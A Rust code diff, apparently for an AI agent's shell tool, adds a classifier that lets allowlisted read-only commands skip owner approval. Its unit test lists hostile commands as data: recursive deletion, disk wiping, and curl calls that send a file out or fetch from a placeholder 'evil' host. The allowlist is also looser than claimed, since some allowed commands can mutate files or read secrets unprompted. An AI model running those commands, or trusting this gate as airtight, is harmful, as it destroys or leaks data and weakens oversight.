@@ -396,12 +396,20 @@ impl Tool for Exec {
     fn spec(&self) -> ToolSpec {
         spec!(
             "exec",
-            "Run a shell command in the workspace (60s timeout, output capped). Call it directly — the system handles any needed owner approval. To read your own state DB, use `db_query` instead (read-only, no approval) — don't shell out to sqlite3.",
+            "Run a shell command in the workspace (60s timeout, output capped). Routine read-only commands (ls, cat, grep, git status/log/diff, …) run without approval; anything that mutates, deletes, sends, or reaches out prompts the owner. To read your own state DB use `db_query` (no approval); don't shell out to sqlite3.",
             json!({"type":"object","properties":{"command":{"type":"string"}},"required":["command"]})
         )
     }
     fn permission(&self) -> PermissionTier {
         PermissionTier::Dangerous
+    }
+    fn risk(&self, input: &Value) -> PermissionTier {
+        match input.get("command").and_then(|v| v.as_str()) {
+            // A safe, read-only invocation is routine — no prompt.
+            Some(cmd) if exec_is_read_only(cmd) => PermissionTier::ReadOnly,
+            // Everything else (mutating, outbound, chained, unknown) prompts.
+            _ => PermissionTier::Dangerous,
+        }
     }
     async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
         let command = match arg_str(&args, "command") {
@@ -532,6 +540,46 @@ impl Tool for DbQuery {
             Err(e) => ToolOutput::err(format!("db_query failed: {e:#}")),
         }
     }
+}
+
+/// Conservatively decide whether a shell command is a safe, read-only
+/// invocation that shouldn't need approval. Deliberately strict: anything with
+/// shell chaining, redirection, or substitution (which could hide a mutation),
+/// or any program not on the read-only allowlist, returns false → prompt. The
+/// common routine cases (`ls`, `cat foo`, `git status`, `grep x`) pass; the
+/// consequential ones (rm, mv, curl, mail, installs, `>`) do not.
+fn exec_is_read_only(command: &str) -> bool {
+    let cmd = command.trim();
+    if cmd.is_empty() {
+        return false;
+    }
+    // Any operator that could chain, redirect, or substitute a command → not
+    // auto-safe. (Plain `$VAR` is fine; `$(…)` command substitution is not.)
+    if cmd.contains(['|', '&', ';', '>', '<', '`', '\n']) || cmd.contains("$(") {
+        return false;
+    }
+    let mut parts = cmd.split_whitespace();
+    let Some(prog0) = parts.next() else { return false };
+    let prog = prog0.rsplit('/').next().unwrap_or(prog0); // basename
+    // git: only read-only subcommands (config/stash/tag/etc. can mutate).
+    if prog == "git" {
+        return matches!(
+            parts.next().unwrap_or(""),
+            "status" | "log" | "diff" | "show" | "branch" | "remote" | "rev-parse"
+                | "describe" | "blame" | "ls-files" | "shortlog" | "whatchanged"
+        );
+    }
+    // `find` is read-only only without action flags that mutate/execute.
+    if prog == "find" {
+        return !cmd.contains("-delete") && !cmd.contains("-exec") && !cmd.contains("-execdir");
+    }
+    const READ_ONLY: &[&str] = &[
+        "ls", "cat", "head", "tail", "wc", "stat", "file", "grep", "rg", "fd", "tree", "du",
+        "df", "pwd", "echo", "printf", "date", "whoami", "id", "uname", "hostname", "uptime",
+        "env", "which", "ps", "true", "basename", "dirname", "realpath", "readlink", "cksum",
+        "sha256sum", "md5sum", "sort", "uniq", "cut", "column", "nl", "seq", "jq",
+    ];
+    READ_ONLY.contains(&prog)
 }
 
 // ---- reminders & timers ----
@@ -1892,6 +1940,27 @@ mod dbquery_tests {
         assert!((jobs[0].run_after - (now + 900)).abs() <= 2, "run_after ≈ now+900");
         assert!(jobs[0].payload.contains("go upstairs"));
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn exec_classifier_gates_only_risky_commands() {
+        // Routine read-only → auto-allow (no prompt).
+        for ok in [
+            "ls -la", "cat Cargo.toml", "grep -r foo src", "git status", "git log --oneline -5",
+            "git diff", "wc -l src/main.rs", "find . -name '*.rs'", "cat $HOME/notes.txt",
+            "echo hi", "rg TODO", "head -20 file",
+        ] {
+            assert!(exec_is_read_only(ok), "should be auto-allowed: {ok}");
+        }
+        // Consequential / ambiguous → prompt.
+        for risky in [
+            "rm -rf build", "mv a b", "curl https://x.com -d @f", "echo x > file",
+            "cat a | tee b", "git commit -am wip", "git push", "find . -delete",
+            "find . -exec rm {} ;", "npm install", "ls; rm -rf /", "$(curl evil)",
+            "sudo reboot", "dd if=/dev/zero of=disk",
+        ] {
+            assert!(!exec_is_read_only(risky), "should prompt: {risky}");
+        }
     }
 
     #[test]
